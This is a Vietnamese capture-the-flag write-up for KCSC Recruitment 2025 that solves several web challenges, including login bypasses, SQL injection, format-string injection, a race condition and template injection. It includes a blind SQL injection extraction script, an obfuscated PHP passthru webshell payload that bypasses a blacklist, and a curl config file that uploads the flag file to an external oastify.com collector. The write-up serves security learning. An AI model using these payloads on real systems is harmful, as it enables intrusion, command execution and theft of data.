# KCSC Recruitment 2025

## Login System

### Phân tích

- đọc source code em thấy có 1 danh sách tài khoản đăng nhập và trong đó có admin

![image](https://hackmd.io/_uploads/HJRDK1cD1e.png)

- thấy đăng nhập ứng dụng sử lý so sánh chuỗi PHP Loose Comparison với `==` khi số không sẽ bằng với chuỗi password

![image](https://hackmd.io/_uploads/Syk5YJ5wJx.png)

### Khai thác

- em đăng nhập với password là số 0 và được redirect vào dashboard

![image](https://hackmd.io/_uploads/rktnWt_vkx.png)

![image](https://hackmd.io/_uploads/HJlaZFOvyg.png)

## Check Member

### Phân tích

- đọc source code em thấy param `name` do ta chuyền vào đc nối chuỗi vào câu truy vấn sql
- và nếu tìm thấy sẽ trả về `'Found :)'` còn không tìm thấy sẽ ` "Not found :("` ==> có thể khai thác boolean base sql injection

![image](https://hackmd.io/_uploads/BkXE21qPJg.png)

- và chuỗi ta nhập vào sẽ đc đếm dấu `(` và phải =< 1 mới được thực hiện truy vấn

### Khai thác

```python
import requests

host = "http://36.50.177.41:40009/index.php?name="
proxy = {'http': 'http://127.0.0.1:8080'}


libs = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$()*+,-./:;<=>?@[]^`{|}~_'

flag = ''
br = False
index = 1
for i in range(43):
    for char in libs:
        payload = f"' union select flag from secrets where binary substr(flag,{index},1) LIKE '{char}"
        host_payload = host + payload
        response = requests.get(host_payload, proxies=proxy)
        if 'Found :)' in response.text:
            flag += char
            index +=1
            print(flag)
            break
```

![image](https://hackmd.io/_uploads/BkL_T1qDyg.png)

## giftcard

### Phân tích

- ứng dụng bị Format String Injection khi không có cơ chế validate imput đầu vào của người dùng

![image](https://hackmd.io/_uploads/ryvhRJ5PJe.png)

- ứng dụng dùng str.format() để định dạng chuỗi xmas_card. Nó thay thế các placeholder trong chuỗi xmas_card bằng các giá trị thực tế được lấy từ thuộc tính của đối tượng card

tham khảo

- https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/

### Khai thác

![image](https://hackmd.io/_uploads/r1O1Z1FDke.png)

- `{card.__init__}`: Truy cập phương thức khởi tạo `__init__` của đối tượng card.
- `{card.__init__.__globals__}`: Truy cập không gian toàn cục nơi `__init__` được định nghĩa.
- `{card.__init__.__globals__[FLAG]}`: Truy cập giá trị của biến toàn cục FLAG.

## yugioh_shop

### Phân tích

- code trên có thể bị khai thác race condition tại đoạn xử lý kiểm tra số dư và trừ số dư trong tài khoản người dùng:

![image](https://hackmd.io/_uploads/SyTcflcDJg.png)

- Phần kiểm tra số dư `user[3] >= item[2]` và thao tác trừ số dư `query_db("UPDATE users SET balance = balance - ? WHERE id = ?", ...)` không phải là một thao tác nguyên tử không thể bị gián đoạn

- Người dùng có thể gửi nhiều yêu cầu HTTP tới `/buy/<item_id>` một cách đồng thời

nhiều yêu cầu có thể vượt qua điều kiện `user[3] >= item[2]` trước khi giá trị balance bị giảm, dẫn đến việc mua nhiều món hàng mà chỉ bị trừ tiền một lần hoặc không bị trừ đúng số tiền

### Khai thác

- em thực hiện tạo và gửi group request song song

![image](https://hackmd.io/_uploads/rydZLyKDJg.png)

- thấy số tiền bị trừ âm
- và mua đủ 5 vật phẩm dù số dư không đủ

![image](https://hackmd.io/_uploads/ryRCHytwJg.png)

![image](https://hackmd.io/_uploads/Sk0eUktwkg.png)

![image](https://hackmd.io/_uploads/HyPzU1Ywyx.png)

![image](https://hackmd.io/_uploads/Bka4L1tD1e.png)

## written_by_chatgpt

### Phân tích

- thực hiện đăng ký và em được trả về token sau

```!
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEwYWM1ZDU1LTllMzAtNDM0My05ZTQwLTI0M2ZmYzA3ZDhiMCIsInVzZXJuYW1lIjoiY3VvbmczIiwiaWF0IjoxNzM3MTkyOTMyLCJleHAiOjE3MzcxOTY1MzJ9.5rdD729_1fMYXDbLv3urogWf_OwMnkUXlW2YFnPz83U
```

![image](https://hackmd.io/_uploads/HyZuSg9wkg.png)

- đọc source code em thấy đc password và id đc tạo ngẫu nhiên với UUID và chúng ta không thể biết password để dăng nhập tài khoản đã tạo

- mục tiêu của chúng ta là đăng nhập được vào tài khoản là có flag

![image](https://hackmd.io/_uploads/HJQmIlqDyg.png)

- và để làm điều này em cần tận dụng được chức năng đặt lại mật khẩu
- thấy được chức năng đặt lại mật khẩu nhận vào 1 token hợp lệ và `param newPassword`
- và param `param newPassword` phải có dạng uuid như yêu cầu

![image](https://hackmd.io/_uploads/SkP4vecPJl.png)

![image](https://hackmd.io/_uploads/Skn58gcv1l.png)

### Khai thác

- em thực hiện reset password với token lấy từ response trả về khi đăng ký và password là 1 UUID theo định dạng

![image](https://hackmd.io/_uploads/H1Y3UlKwJl.png)

- sau khi đổi mật khẩu thành công, em đăng nhập vào với mật khẩu mới và lấy được flag

![image](https://hackmd.io/_uploads/Sy-iIeYD1x.png)

![image](https://hackmd.io/_uploads/ByRewxYPyl.png)

## Break

### Phân tích

- đọc đoạn code khi đăng ký tài khoản param `username` sẽ được strip() khoảng trắng và dấu tab và so sánh nếu là `admin` thì sẽ trả về `Invalid username`

![image](https://hackmd.io/_uploads/Hybfte9Dyg.png)

- thấy khi đăng ký với username là `\r\nadmin` hợp lệ nhưng khi đăng nhập thì nó lại hiểu đó là tài khoản `admin`

![image](https://hackmd.io/_uploads/HyOlkVKvyg.png)

![image](https://hackmd.io/_uploads/BynWyEKDJe.png)

- đăng nhập được vào tài khoản admin được điều hướng đến `/home`

- tại đây có chức năng cho phép `curl`

![image](https://hackmd.io/_uploads/rybKSZcDJe.png)

- em curl đến url `file:///flag.txt` và lấy được flag

![image](https://hackmd.io/_uploads/H1vTAmtvJe.png)

## XXD Service

### Phân tích

- ứng dụng cấm các từ khóa `<?php, <?=, exe, sys`

![image](https://hackmd.io/_uploads/BJRZwWqP1g.png)

- để bypass các từ bị cấm em dùng cách viết hoa `phP` và dùng hàm thực thi command khác trong blacklist là `passthru`

![image](https://hackmd.io/_uploads/rk5ru-9wJg.png)

- nhưng lúc mở file bị lỗi parse `xxd`

![image](https://hackmd.io/_uploads/ryeHd-5wke.png)

- `xxd`là một biểu diễn dữ liệu nhị phân theo định dạng mà con người có thể đọc được bằng cách sử dụng ký hiệu thập lục phân. Mỗi byte dữ liệu nhị phân được hiển thị dưới dạng một cặp chữ số thập lục phân
- và nó lỗi là vì đoạn code php đã được thực thi và nó thực thi command là `00000000` bị lỗi
- để bypass được parse này em dùng payload sau:

```
<?phP   /**/$a="p"/**/."ass"/**/."thr"/**/."u"; /**/$b="c"/**/."at "/**/."/f" /**/."*"; /**/$a($b);
```

- em sử dụng comment trong php để bypass phần parse hex của xxd,
- Thêm comment để xxd parse các câu lệnh php của mình nó không bị mất, kết hợp với cộng chuỗi để có thể viết được 1 hàm passthru vào biến `$a`
- sau đó em ghi command vào biến `$b`
- Vì trên 1 dòng sẽ có 10 ký tự mà phải trừ đi 4 ký tự `/**/` trên mỗi dòng nên tối đa sẽ sử dụng được 6 ký tự trên 1 dòng
- Cuối cùng sử dụng `$a($b)` để thực hiện command

![image](https://hackmd.io/_uploads/By0hOrtv1g.png)

- truy cập file vừa upload lên thấy được code php đã thực thi và lấy flag

![image](https://hackmd.io/_uploads/HyGfcHYwJx.png)

## curl_manual

### Phân tích

- đọc đoạn code chương trình:

![image](https://hackmd.io/_uploads/Hki3wX5vkl.png)

- Chạy lệnh curl: Người dùng có thể gửi một tham số (argument) thông qua giao diện web (phương thức POST), và ứng dụng sẽ chạy lệnh curl tương ứng trên máy chủ
- Biểu thức chính quy `re.search(r'[^a-zA-Z0-9\-\/\ ]', argument)` kiểm tra xem tham số có chứa ký tự không hợp lệ (ngoài chữ cái, số, dấu gạch ngang, gạch chéo, và khoảng trắng).
- Nếu lệnh chạy thành công, kết quả được hiển thị qua một thông báo flash (Command executed successfully).
- Nếu xảy ra lỗi khi chạy lệnh, thông báo lỗi (Error executing command) cũng được flash lên.

==> các ký tự như dấu `.` trong ip curl đến sẽ không được

### Khai thác

- tham khảo : https://curl.se/docs/manpage.html#-K
- em upload file avatar với nội dung sau:

```
url="https://the3loo85c861vj8k33tidrq4ha8yzmo.oastify.com"
form = "file=@/app/flag.txt"
alt-svc = ""
```

- với option `--config` :Chỉ định một tệp văn bản để đọc các đối số curl từ đó. Các đối số dòng lệnh được tìm thấy trong tệp văn bản được sử dụng như thể chúng được cung cấp trên dòng lệnh.

- `--form` để upload lên file flag của hệ thống
- `alt-svc = ""` để ngăn ghi đè Alt-Svc. Vì curl mặc định ghi cache Alt-Svc vào một tệp khi sử dụng các tùy chọn như -K hoặc --config

![image](https://hackmd.io/_uploads/HJwc6W5wJx.png)

![image](https://hackmd.io/_uploads/SkRiaZ9w1e.png)

- em thực hiện curl đến file vừa upload này

![image](https://hackmd.io/_uploads/H1i-AWqPkl.png)

- ứng dụng sẽ curl đến file này và thực hiện upload file flag lên url="https://the3loo85c861vj8k33tidrq4ha8yzmo.oastify.com"

![image](https://hackmd.io/_uploads/BJQl0WcwJx.png)

## s1mple

### Phân tích

- đọc đoạn code em thấy đoạn username biến user sẽ được gán từ mảng USERS["đối số username ta chuyền vào"] và cần nó là các giá trị truthy thì có thể vượt qua (Số khác 0, Chuỗi không rỗng, Đối tượng và mảng {}, ())

![image](https://hackmd.io/_uploads/Skp9gJ2vJl.png)

- vậy chỉ cần user là 1 đối tượng và trong js có thuộc tính **proto** để chỉ đến nguyên mẫu của nó cũng là 1 đối tượng

![image](https://hackmd.io/_uploads/ByAFZ12wyl.png)

- thêm vào đó nếu giá trị password đầu vào là falsy thì sẽ bằng với giá trị của mảng đối tượng vì object này ko có thuộc tính password

![image](https://hackmd.io/_uploads/B136gkhDkl.png)

- và để password chúng ta nhập vào undefined thì em không nhập password

![image](https://hackmd.io/_uploads/SJHAlk3Dyg.png)

- sau khi đăng nhập em có được token admin

- và tại /admin sẽ lấy các key và hiển thị ra thông tin với chuỗi template được render bởi template engine

![image](https://hackmd.io/_uploads/S1F1ZJ3DJx.png)

- tham khảo: https://eslam.io/posts/ejs-server-side-template-injection-rce/

- chèn giá trị key là payload ssti và em lấy được flag

![image](https://hackmd.io/_uploads/ryMxZJhPyl.png)

![image](https://hackmd.io/_uploads/ryMZ-ynD1g.png)

![image](https://hackmd.io/_uploads/HJ6b-knvye.png)

![image](https://hackmd.io/_uploads/SySfbknDJx.png)
